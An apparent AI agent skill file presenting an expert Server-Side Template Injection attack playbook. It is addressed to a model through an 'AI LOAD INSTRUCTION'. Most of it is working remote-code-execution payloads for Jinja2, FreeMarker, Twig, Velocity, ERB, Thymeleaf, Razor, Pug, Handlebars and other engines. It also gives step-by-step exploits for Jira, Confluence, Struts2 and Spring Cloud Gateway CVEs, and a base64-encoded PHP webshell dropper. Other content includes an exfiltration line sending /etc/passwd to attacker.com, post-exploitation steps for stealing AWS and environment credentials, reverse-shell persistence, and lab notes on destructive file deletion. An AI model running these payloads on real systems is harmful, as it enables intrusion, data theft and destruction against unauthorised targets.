---
name: ssti-server-side-template-injection
description: >-
  SSTI playbook. Use when template expressions, server-side rendering, preview features, or templating engines may evaluate attacker-controlled content.
---

# SKILL: Server-Side Template Injection (SSTI) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert SSTI techniques. Covers polyglot detection probes, engine fingerprinting, Jinja2/FreeMarker/Twig/ERB RCE chains, client-side Angular SSTI, and bypass techniques. Base models often miss sandbox escape MRO chains and non-Jinja2 engines.

## 0. RELATED ROUTING

Before using full engine-specific exploitation, you can first load:

- 先直接使用本文件开头的 polyglot probe sequence 做低噪声指纹判断
- [expression-language-injection](../expression-language-injection/SKILL.md) when `${7*7}` or `%{7*7}` resolves in Java (SpEL/OGNL) — different attack surface from template engines


### Universal detection & blind SSTI (pointer)

Use the polyglot payload and math probes in §1 and §13 first; when you need fuller blind-test patterns and per-engine examples (including non-Python stacks), follow the extended-case section later in this file §11 and cross-check §14 here for technique names (boolean, time, OOB, error-based).

---

## 1. DETECTION — POLYGLOT PROBE SEQUENCE

First test: distinguish SSTI from XSS. Send these probes and check if **math is evaluated** server-side:

```
{{7*7}}        → IF returns 49 (not {{7*7}}) → Jinja2 or Twig
${7*7}         → IF returns 49 → FreeMarker, Velocity, or Java EL
#{7*7}         → Ruby (ERB interpolation in strings)
<#assign x=7*7>${x}  → FreeMarker
@{7*7}         → Thymeleaf
*{7*7}         → Thymeleaf SpEL (*{...})
```

**Jinja2 vs Twig disambiguation**:
```
{{7*'7'}}
→ 7777777  = Jinja2 (Python string multiplication)
→ 49       = Twig (PHP numeric)
```

**Safe detection probe** (no math, just boolean):
```
{{''.__class__}}   → class 'str' = Python/Jinja2
```

---

## 2. ENGINE-TO-LANGUAGE MAPPING

| Template Engine | Language | Framework |
|---|---|---|
| Jinja2 | Python | Flask, FastAPI |
| Django Templates | Python | Django |
| Mako | Python | Pyramid |
| Twig | PHP | Symfony, Laravel |
| Smarty | PHP | Various |
| FreeMarker | Java | Spring MVC |
| Velocity | Java | Various Java |
| Pebble | Java | Various Java |
| Thymeleaf | Java | Spring Boot |
| ERB | Ruby | Rails |
| Slim / Haml | Ruby | Rails |
| Jade / Pug | Node.js | Express |
| Handlebars | Node.js | Express |
| Tornado | Python | Tornado |

Identifying language from errors → then narrow to template engine.

---

## 3. JINJA2 (PYTHON FLASK) — RCE CHAINS

### Chain 1: `os` module via `__globals__`
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Chain 2: MRO subclass traversal (sandbox escape)
```python
# List all subclasses:
{{''.__class__.__mro__[1].__subclasses__()}}

# Find subprocess.Popen index (usually around 258-270, varies by Python version):
# Look for "subprocess.Popen" in the list

# Execute command (replace [258] with correct index):
{{''.__class__.__mro__[1].__subclasses__()[258]('id', shell=True, stdout=-1).communicate()[0]}}
```

### Chain 3: `request` object globals (works when `config` blocked)
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
(Uses hex encoding to avoid `_` filtering)

### Chain 4: `lipsum` function globals (Flask built-in)
```python
{{lipsum.__globals__.os.popen('id').read()}}
```

### Chain 5: `cycler` object
```python
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

### Finding correct subprocess index dynamically:
```python
# In injection:
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'Popen' in c.__name__ %}
    {{loop.index}}
  {% endif %}
{% endfor %}
```

---

## 4. JINJA2 SANDBOX BYPASS TECHNIQUES

### When `_` (underscore) is blocked:
```python
# Use attr filter with hex encoding:
''|attr('\x5f\x5fclass\x5f\x5f')

# Use getattr via request object:
request|attr('args')|attr('__class__')
```

### When `.` (dot) is blocked:
```python
# Use [] subscript notation:
''['__class__']
config['SECRET_KEY']
```

### When keywords (class, mro) are blocked:
Use hex/unicode in `attr()`:
```python
|attr('\x5f\x5fclass\x5f\x5f')
|attr('\x5f\x5fm\x72\x6F\x5f\x5f')
```

### When output encoding strips HTML entities:
Use `|safe` filter to prevent auto-escaping.

---

## 5. FREEMARKER (JAVA) — RCE

### Execute Command via freemarker.template.utility.Execute
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

### Alternative via ObjectConstructor:
```freemarker  
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
<#assign br=ob("java.io.BufferedReader",ob("java.io.InputStreamReader",ob("java.lang.Runtime")?api.exec("id").inputStream))>
${br.readLine()}
```

---

## 6. TWIG (PHP) — RCE

```php
// Twig 1.x (before sandbox):
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

// Twig 2.x using built-ins:
{{['id']|map('system')|join}}

// via filter map:
{{app.request.server.all|join(',')}}
```

---

## 7. VELOCITY (JAVA) — RCE

```velocity
#set($str=$class.inspect("java.lang.Runtime").method.invoke($class.inspect("java.lang.Runtime").type, null))
#set($run=$str.exec("id"))
#set($out=$run.inputStream)
```

Or more directly:
```velocity
#set($class=$currentNode.getClass())
#set($rt=$class.forName("java.lang.Runtime"))
#set($proc=$rt.getMethod("exec",$class.forName("java.lang.String")).invoke($rt.getMethod("getRuntime").invoke(null),"id"))
```

---

## 8. ERB (RUBY RAILS) — RCE

```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.read('/etc/passwd') %>
```

---

## 9. THYMELEAF (JAVA SPRING) — RCE

Thymeleaf with Spring EL (SpEL):
```java
// In th:text or th:fragment context:
__${T(java.lang.Runtime).getRuntime().exec("id")}__::type

// Fragment expression context:
__${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","id"}).getInputStream())}__::type
```

---

## 10. CLIENT-SIDE TEMPLATE INJECTION (AngularJS)

When AngularJS is used client-side and user data flows into template expressions:

```javascript
// AngularJS 1.x sandbox escape:
{{constructor.constructor('alert(1)')()}}

// 1.5.x:
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}

// 1.3.x:
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

**Detection**: send `{{1+1}}` — if page shows `2`, AngularJS evaluates expressions in the DOM.

---

## 11. SSTI → FULL RCE PATH

```
SSTI detected → identify engine
├── Jinja2 → config.__globals__['os'].popen() 
│           OR subclass traversal for Popen
├── FreeMarker → freemarker.template.utility.Execute?new()
├── Twig → _self.env.registerUndefinedFilterCallback('exec')
├── Velocity → java.lang.Runtime.exec()
├── ERB → <%= `cmd` %>
├── Thymeleaf → T(java.lang.Runtime).getRuntime().exec()
└── Angular CSTI → constructor.constructor('payload')()
```

**Post-RCE pivot**:
1. Read `/proc/self/environ` — env vars with credentials
2. Read application config files — DB passwords, API keys
3. `cat ~/.aws/credentials` — cloud credentials
4. Reverse shell for persistence

---

## 12. COMMON INJECTION ENTRY POINTS

Where user data enters templates:
- URL path: `https://site.com/home?name={{7*7}}`
- Query parameters: `?message=Hello`
- HTML forms: profile name, bio, content fields
- Error pages: `404 Not Found: /PAYLOAD`
- Email templates: name in password reset emails
- Inline template rendering: `render_template_string(user_input)`

**Most dangerous**: `render_template_string()` in Flask — entire user input used as template.

---

## 13. UNIVERSAL DETECTION PAYLOADS

**Polyglot probe** that triggers errors or evaluation in many engines:

```
${{<%[%'"}}%\.
```

**Mathematical probes** for blind/error confirmation:

```
{{7*7}}          → 49 (Jinja2, Twig, Nunjucks, Handlebars)
${7*7}           → 49 (FreeMarker, Velocity, EL, Thymeleaf)
<%= 7*7 %>       → 49 (ERB, EJS, EEx)
#{7*7}           → 49 (Pug, Ruby interpolation)
@(7*7)           → 49 (Razor)
{7*7}            → 49 (Smarty)
```

**Error-based engine fingerprint** (parser/stack traces often name the engine):

```
(1/0).zxy.zxy
```

---

## 14. BLIND SSTI TECHNIQUES

- **Boolean-based**: Compare `(3*4/2)` vs `3*)2(/4` — if the first resolves and the second errors, evaluation is likely
- **Time-based**: `{{sleep(5)}}` or the engine-specific equivalent for delay
- **OOB**: DNS/HTTP callback via template expressions when direct output is not visible
- **Error-based**: Force different error messages based on true/false conditions

---

## 15. FLASK PIN CALCULATION

When Flask **debug mode** (Werkzeug debugger) is exposed but **PIN-protected**, the PIN is derived from host-specific values. Typical inputs for public PIN calculation scripts:

1. **`username`** — from `/etc/passwd` (the user running the Flask process)
2. **Module name** — often `flask.app` or `Flask`
3. **Application path** — `app.py` or the real main filename
4. **MAC address** — e.g. `/sys/class/net/eth0/address`, converted to decimal as Werkzeug expects
5. **Machine ID** — `/etc/machine-id`, or `/proc/sys/kernel/random/boot_id` combined with the first line of `/proc/self/cgroup` per Werkzeug’s algorithm
6. **Compute PIN** — use established open-source PIN calculators that implement the same algorithm from these values

> Use only on systems you are authorized to test; obtaining these values implies prior access or an additional info-disclosure vector.

## SRC / Practice note - 2026-08-06 ERB basic SSTI completion

- If a reflected message parameter on the home page is rendered through ERB, first use a harmless arithmetic expression to prove template evaluation before switching to filesystem-affecting payloads.
- A second-stage probe like Ruby `system("id")` helps distinguish plain interpolation from arbitrary code execution and reveals the effective server-side user context.
- When the objective is file deletion, a direct Ruby file API primitive may be cleaner than shelling out, and the final solved marker should be verified separately from the code-execution proof.

## SRC / Practice note - 2026-08-06 Tornado basic SSTI completion


- Start from the real feature path instead of the lab title: in this case, the reachable sink was the profile endpoint that changes how comment authors are rendered, not the main blog index.
- Treat selector-like values such as `user.name` / `user.first_name` / `user.nickname` as a strong hint that server code may splice a user-controlled fragment directly into a template expression.
- Prove evaluation with a low-risk arithmetic expression first, then force the application to render a fresh artifact you control; here, posting a new comment after setting the preferred-name expression to `7*7` produced author output `49` and gave a clean confirmation point.
- If a direct Python builtin path fails in Tornado code context, switch to template breakout: close the original `{{ ... }}` expression, inject `{% import os %}`, then reopen `{{ ... }}` for the next expression. A harmless verification branch rendered `4949`, confirming both expression execution and statement injection.
- Separate the exploit trigger from the solved-state check. Comment rendering can throw noisy 500 responses after a bad branch, so verify completion independently by checking the lab banner for `is-solved` / `Solved` rather than relying only on the comment response.

## SRC / Practice note - 2026-08-06 FreeMarker documentation-driven SSTI completion

- Do not assume the first visible action is the real sink. In this case, the `preview` branch reflected probes literally, while the `save` branch persisted the template and the product page executed it. Split those two paths early.
- Start with low-noise arithmetic on the persisted render path. `${7*7}` yielding `49` proved server-side evaluation only after saving and revisiting the product page.
- Use an engine-specific feature probe before RCE. `<#assign x=7*7>${x}` confirmed FreeMarker semantics and avoided guessing between generic `${...}` engines.
- Separate code-execution proof from the objective. A harmless `Execute` call returning the effective user context (`whoami`) confirmed RCE before the file-deletion step.
- Keep four artifacts distinct in evidence: sink discovery (`preview` vs `save`), engine fingerprint, command-execution proof, and the explicit `Solved` marker. After completion, restore the original template so the content-management path stays clean for follow-up work.

## SRC / Practice note - 2026-08-07 Handlebars documented-exploit SSTI completion

- If a product action redirects back to `/` with a `message` parameter, do not stop at reflection. Compare plain `${...}` and `{{...}}` branches to separate literal reflection from template parsing.
- A parser stack trace naming `handlebars/compiler/parser.js` is a high-confidence fingerprint. Preserve that error separately from execution proof.
- In this chain, `{{7*7}}` only proved parser rejection, while `{{#with "abc"}}X{{this}}Y{{/with}}` confirmed actual Handlebars block execution. Use low-risk helper/block probes before attempting constructor abuse.
- For the documented exploit path, verify three stages independently: constructor reachability, JavaScript execution context, and module import path. Here, `typeof require === function` inside the constructed function was the decisive branch, and `whoami` was used before the file-deletion step.
- Keep sink identification, engine fingerprint, benign command proof, destructive objective, and explicit `Solved` verification as separate evidence items.

## SRC / Practice note - 2026-08-07 Django settings disclosure SSTI completion

- When a server-side template editor exposes a preview/save workflow, start with a harmless Django tag such as `{% debug %}` before chasing deeper Python internals. A context dump that explicitly shows objects like `settings` is already a decisive branch.
- Separate low-risk reconnaissance from objective extraction: first prove template execution, then check whether the debug output reveals privileged context objects, then request only the specific sensitive setting you need.
- In this lab, `{{settings.SECRET_KEY}}` was sufficient after `{% debug %}` established that `settings` was present in context. Treat that transition as a reusable pattern for Django template sinks that pass rich objects into user-controlled templates.
- Keep four checkpoints distinct in evidence: authenticated access to the editing surface, template-engine fingerprint/context disclosure, targeted secret retrieval, and the explicit solved marker after submission.

## SRC / Practice note - 2026-08-07 FreeMarker sandbox breakout via URI/file stream

- In sandboxed FreeMarker sinks, keep the engine fingerprint and sandbox-bypass chain separate. `${.version}` plus a low-noise object probe like `${product.class}` is enough to establish both the engine and the exposed Java object surface.
- If `?new()` on dangerous helper classes is blocked, pivot to methods on already exposed Java objects instead of forcing the same path. Here, the reachable `product.class.protectionDomain.codeSource.location.toURI()` chain provided a safe bridge to a `file:/...` URL without needing restricted constructors.
- Treat `readAllBytes()?join(",")` as a controlled extraction primitive when raw stream objects are reachable but direct string construction is constrained. It preserves proof of filesystem access without depending on additional helper classes.
- Preserve evidence in four distinct checkpoints: engine fingerprint, exposed Java object/class proof, file-read primitive, and explicit solved-state verification after submitting the decoded bytes.

## SRC / Practice note - 2026-08-07 Twig custom exploit via avatar symlink + gdprDelete

- When a profile selector accepts values like `user.name` / `user.first_name` / `user.nickname`, treat it as a likely raw Twig expression sink. A low-noise arithmetic probe such as `7*7` turning the rendered author name into `49` is enough to confirm server-side evaluation.
- If the context is sparse, enumerate it instead of guessing. `_context|keys|join(',')` verified that only `user` was available, and `user|json_encode` surfaced the file-path fields (`user_dir`, `avatarLink`) that mattered for the next pivot.
- Preserve evidence in distinct checkpoints: expression-evaluation proof, context/object disclosure, source-code disclosure of the dangerous methods, destructive payload execution, and the explicit solved-state banner.

## Extended cases merged from SCENARIOS.md

## 1. CVE Case: Maccms 8.x PHP Template Eval


Maccms (a Chinese CMS) uses `eval()` to process template variables in search functionality:

**Attack path**: `/vod-search` endpoint passes user input into template evaluation.

```
# Step 1: Identify injection point
GET /index.php?m=vod-search&wd={if-A:phpinfo()}{endif-A}

# Step 2: Write webshell (bypass quote filtering via base64):
GET /index.php?m=vod-search&wd={if-A:eval(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJ3NoZWxsLnBocCcsJzw/cGhwIGV2YWwoJF9QT1NUW2FdKTs/PicpOw=='))}{endif-A}
# base64 decodes to: file_put_contents('shell.php','<?php eval($_POST[a]);?>');

# Step 3: Access webshell
POST /shell.php
a=system('id');
```

**Key technique**: base64 encoding to bypass quote/special character filtering in template context.

---

## 2. CVE Case: Atlassian Jira SSTI (CVE-2019-11581)


Jira's "Contact Administrators" form processes template expressions in the subject/body:

**Prerequisites**: "Contact Administrators Form" must be enabled; SMTP must be configured.

```
# Step 1: Navigate to /secure/ContactAdministrators!default.jspa
# Step 2: In the subject or message field, inject:
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')

# Step 3: Submit the form
# Step 4: Check email queue or admin notification for command output
```

**Note**: Output appears in the email sent to administrators, not in the HTTP response. Monitor outbound email or use OOB techniques (DNS/HTTP callback).

---

## 3. Spring Cloud Gateway SpEL Injection (CVE-2022-22947)


Spring Cloud Gateway's actuator endpoint allows adding routes with SpEL expressions in filter arguments:

```bash
# Add malicious route:
POST /actuator/gateway/routes/pwn HTTP/1.1
Content-Type: application/json

{
  "id": "pwn",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "X-Pwn",
      "value": "#{T(java.lang.Runtime).getRuntime().exec('id')}"
    }
  }],
  "uri": "http://example.com",
  "predicates": [{"name": "Path", "args": {"_genkey_0": "/pwn/**"}}]
}

# Refresh to apply:
POST /actuator/gateway/refresh

# Trigger:
GET /pwn/anything
# Check X-Pwn response header for command output
```

Also see the dedicated [expression-language-injection](../expression-language-injection/SKILL.md) skill for SpEL/OGNL deep dives.

---

## 4. Struts2 OGNL → RCE (S2-045 / CVE-2017-5638)


Content-Type header with OGNL expression triggers evaluation in Struts2's multipart parser:

```
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

Also see [expression-language-injection](../expression-language-injection/SKILL.md) for the full OGNL treatment.

---

## 5. Confluence OGNL Injection (CVE-2021-26084)


Confluence Server's `createpage-entervariables.action` evaluates OGNL in query parameters:

```bash
# Probe:
curl -X POST 'https://TARGET/pages/createpage-entervariables.action' \
  -d 'queryString=\u0027%2b{3*3}%2b\u0027'
# If response contains "9" → confirmed

# RCE:
curl -X POST 'https://TARGET/pages/createpage-entervariables.action' \
  -d 'queryString=\u0027%2b{Class.forName("java.lang.Runtime").getMethod("exec",Class.forName("java.lang.String")).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}%2b\u0027'
```

---

## 6. SSTI vs EL Injection — When to Cross-Reference


| Indicator | Go To |
|---|---|
| `{{7*7}}` returns 49, Python error traces | Stay here (Jinja2/Twig SSTI) |
| `${7*7}` returns 49, Java stack traces | [expression-language-injection](../expression-language-injection/SKILL.md) |
| `%{7*7}` returns 49, Struts2 errors | [expression-language-injection](../expression-language-injection/SKILL.md) |
| Template syntax with `{if-A:...}` style | PHP CMS template eval (this file, scenario 1) |

---

## 7. Additional Template Engines — ASP.NET Razor


```csharp
// Detection
@(1+2)    // Returns 3

// Code execution block
@{
    var proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "cmd.exe";
    proc.StartInfo.Arguments = "/c whoami";
    proc.StartInfo.RedirectStandardOutput = true;
    proc.StartInfo.UseShellExecute = false;
    proc.Start();
    var output = proc.StandardOutput.ReadToEnd();
}
<p>@output</p>
```

---

## 8. Additional Template Engines — Elixir EEx/LEEx/HEEx


```elixir
# Basic detection
<%= 7*7 %>

# Command execution
<%= elem(System.shell("id"), 0) %>
<%= System.cmd("cat", ["/etc/passwd"]) |> elem(0) %>

# File read
<%= File.read!("/etc/passwd") %>

# Error-based detection
<%= elem(System.shell("invalid_cmd"), 1) %>

# Boolean-based
<%= if elem(System.shell("test -f /etc/passwd"), 1) == 0, do: "EXISTS", else: "NOPE" %>

# Time-based
<%= System.shell("sleep 5") %>
```

---

## 9. Additional Template Engines — PHP Engines


### Smarty (versions matter)
```php
// Smarty 2.x (deprecated but still found)
{php}system('id');{/php}

// Smarty 3.x+ ({php} removed, use tags)
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['c']); ?>",self::clearConfig())}

// Self-reading
{self::getStreamVariable("file:///etc/passwd")}
```

### Latte (Nette framework)
```
{php system('id')}
{='id'|system}
```

### Blade (Laravel) — Rarely exploitable server-side
```
// Raw output (if user controls template source)
{!! system('id') !!}
// @php directive
@php system('id') @endphp
```

### Plates (PHP)
```php
<?php system('id') ?>
// Plates uses raw PHP, so any PHP in template = RCE
```

---

## 10. Additional Template Engines — JavaScript Stack


### Universal Node.js Chain
```javascript
// Works across many JS template engines:
global.process.mainModule.require('child_process').execSync('id').toString()
```

### Pug (formerly Jade)
```
// Detection
#{7*7}

// RCE
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").execSync("id").toString();return sh}()}
```

### Handlebars (older versions RCE chain)
```javascript
// Requires prototype pollution or specific Handlebars version
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Nunjucks
```
// Detection
{{7*7}}

// RCE
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
```

### EJS
```javascript
// Detection: <% %> tags
<%= 7*7 %>

// RCE
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
```

### Lodash (_.template)
```javascript
// Detection
${7*7}

// RCE
${global.process.mainModule.require('child_process').execSync('id')}
```

---

## 11. Universal SSTI Detection & Blind Techniques


### Universal Detection Payload
```
${{<%[%'"}}%\.
```
This triggers errors in most template engines, revealing the engine type via error messages.

### Mathematical Detection
```
{{7*7}}     → Jinja2, Twig, Nunjucks
${7*7}      → FreeMarker, Velocity, EJS, Lodash
<%= 7*7 %>  → ERB, EJS, EEx
#{7*7}      → Pug, Slim
@(7*7)      → Razor
{7*7}       → Smarty
(1/0).zxy   → Error-based detection
```

### Blind SSTI (no output reflected)
```
# Boolean-based: compare response length/content for true vs false conditions
{{(3*4/2)==6}}  vs  {{(3*4/2)==7}}

# Time-based (Jinja2):
{% for i in range(10000000) %}{% endfor %}

# OOB (out-of-band):
# Jinja2: {{''.__class__.__mro__[1].__subclasses__()[X]('curl attacker.com/'+open('/etc/passwd').read(),shell=True)}}
```

### Flask Debug PIN Calculation
When Flask debug mode is enabled, calculate the PIN from leaked files:
```
Required values:
1. username: /etc/passwd → find flask process owner
2. modname: usually "flask.app"
3. appname: usually "Flask"
4. modpath: /path/to/flask/app.py (from error page)
5. MAC address: /sys/class/net/eth0/address → convert to decimal
6. machine-id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup (first hex after last /)

Combine: md5(mac + machine_id) → first 9 digits = PIN
```
